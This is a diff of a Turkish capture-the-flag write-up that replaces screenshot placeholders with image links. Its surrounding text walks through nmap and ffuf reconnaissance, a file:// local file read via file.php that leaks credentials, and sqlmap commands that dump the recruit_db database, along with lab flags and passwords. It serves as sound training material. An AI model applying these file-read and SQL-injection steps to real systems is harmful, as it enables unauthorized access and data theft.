@@ -29,8 +29,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-
-> [SCREENSHOT: nmap tarama çıktısı]
+<img width="804" height="409" alt="nmap tarama" src="https://github.com/user-attachments/assets/be79b3eb-7100-4713-bee8-acb3a4814ce8" />
 
 Taramadan elde ettiğim bilgiler:
 
@@ -45,10 +44,6 @@ Asıl saldırı yüzeyinin **80 numaralı portta çalışan web uygulaması** ol
 ## Web Uygulamasının İncelenme
 
 Tarayıcı üzerinden `http://10.112.184.173` adresine gittiğimde bir **giriş (login) sayfası** ile karşılaştım. Sayfanın altında **"Access API"** başlıklı bir bağlantı dikkatimi çekti; bu bağlantı beni `http://10.112.184.173/api.php` sayfasına yönlendirdi.
-
-> [SCREENSHOT: ana sayfa / login ekranı]
-
-> [SCREENSHOT: api.php sayfası]
 
 API dokümantasyon sayfasında şu bilgi yer alıyordu:
 
@@ -78,8 +73,8 @@ javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
 phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
 ```
+<img width="1155" height="366" alt="ffuf tarama" src="https://github.com/user-attachments/assets/0ec67b8d-3637-40cb-b125-2c93f1361464" />
 
-> [SCREENSHOT: ffuf tarama çıktısı]
 
 `/mail` dizini özellikle dikkatimi çekti çünkü tarayıcıdan erişilebilir durumdaydı ve normalde bu tür dizinlerin herkese açık olması beklenmez.
 
@@ -88,8 +83,6 @@ server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
 ## Mail Log Dosyasının İncelenme
 
 `/mail` dizinine gittiğimde `mail.log` isimli bir dosyaya erişebildiğimi fark ettim. İçeriğini inceleyince, IT ekibiyle HR ekibi arasında geçen bir sistem yöneticisi mail yazışması ile karşılaştım.
-
-> [SCREENSHOT: /mail/mail.log içeriği]
 
 ```
 Subject: Recruitment Portal Deployment Confirmation
@@ -120,7 +113,7 @@ http://10.112.184.173/file.php?cv=file://config.php
 
 Sonuç başarılı oldu ve dosya içeriği doğrudan tarayıcıda görüntülendi:
 
-> [SCREENSHOT: file.php ile config.php içeriğinin görüntülenmesi]
+<img width="948" height="655" alt="config php" src="https://github.com/user-attachments/assets/47eced95-2129-4747-a8d3-32e01d436f80" />
 
 ```php
 <?php
@@ -150,7 +143,7 @@ Buradan **HR kullanıcısının şifresini** ele geçirmiş oldum:
 
 Elde ettiğim `hr / hrpassword123` bilgileriyle login sayfasından giriş yaptım ve ilk flag'e ulaştım.
 
-> [SCREENSHOT: HR paneline başarılı giriş]
+<img width="1919" height="851" alt="ilk flag" src="https://github.com/user-attachments/assets/7ad62afd-d99b-4da9-a3fe-24479ef6d2dc" />
 
 ```
 FLAG 1: THM{LOGGED_IN_USER}
@@ -165,7 +158,6 @@ Giriş yaptıktan sonra panelde aday (candidate) bilgilerini içeren bir tablo i
 | 3  | Charlie Brown | Security Analyst     | Rejected     |
 | 4  | Diana Prince  | HR Executive         | Selected     |
 
-> [SCREENSHOT: HR panelindeki aday listesi]
 
 ---
 
@@ -188,8 +180,7 @@ available databases [6]:
 [*] recruit_db
 [*] sys
 ```
-
-> [SCREENSHOT: sqlmap --dbs çıktısı]
+<img width="1215" height="587" alt="sqlçıktısı" src="https://github.com/user-attachments/assets/216c958c-5b9b-46ac-ac14-0345e144f3ca" />
 
 Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanı dikkatimi çekti.
 
@@ -205,6 +196,7 @@ sqlmap -r req.txt -p search -D recruit_db --tables --batch --fresh-queries
 | users      |
 +------------+
 ```
+<img width="1191" height="298" alt="tables" src="https://github.com/user-attachments/assets/98686069-1f08-465b-817b-149f17088847" />
 
 ### users Tablosunun Kolonlarının Listelenmesi
 
@@ -251,7 +243,7 @@ sqlmap -r req.txt -p search -D recruit_db --dump-all --batch --fresh-queries
 +----+---------------+--------------+--------------------+
 ```
 
-> [SCREENSHOT: sqlmap --dump-all çıktısı]
+<img width="1236" height="616" alt="alldatabase" src="https://github.com/user-attachments/assets/9f1e3c56-2d0c-418d-93dc-7013365a28ea" />
 
 Bu adımda mail log'unda belirtilen "admin kimlik bilgileri veritabanında saklanıyor" ifadesinin doğruluğunu teyit etmiş oldum.
 
@@ -261,7 +253,7 @@ Bu adımda mail log'unda belirtilen "admin kimlik bilgileri veritabanında sakla
 
 Ele geçirdiğim `admin / admin@001admin` bilgileriyle sisteme admin olarak giriş yaptım.
 
-> [SCREENSHOT: admin paneline başarılı giriş]
+<img width="1918" height="830" alt="lastflag" src="https://github.com/user-attachments/assets/7a8a475f-7cc6-44fd-a56e-e201efd7cb06" />
 
 ```
 FLAG 2: THM{LOGGED_IN_ADM1N1}
